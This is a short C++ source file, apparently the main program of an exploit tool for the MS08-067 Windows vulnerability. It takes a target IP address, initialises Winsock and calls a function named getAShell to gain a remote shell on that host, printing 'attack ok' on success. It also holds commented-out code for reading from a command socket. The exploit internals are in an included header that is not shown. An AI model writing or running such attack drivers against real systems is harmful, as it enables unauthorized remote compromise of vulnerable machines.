/*
 * Author: thirdstormofcythraul@outlook.com
 */
#define _CRTDBG_MAP_ALLOC
#include <stdlib.h>
#include <crtdbg.h>

#include <tchar.h>

#include <ms08-067.h>

int _tmain(int argc, _TCHAR* argv[])
{
	_CrtSetDbgFlag ( _CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF );

	if (argc != 2) {
		printf("usage: %s ip\n", argv[0]);
		return 1;
	}

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2), &wsaData);

	if (Ms08067::getAShell(argv[1])) {
		printf("attack ok\n");
		//Tcp tcp = Ms08067::getCommandSocket(argv[1]);
		//while (tcp.selectread(5)) {
		//	Tcp::readResponseFromSocket(tcp.m_socket);
		//}

	}
	return 0;
}

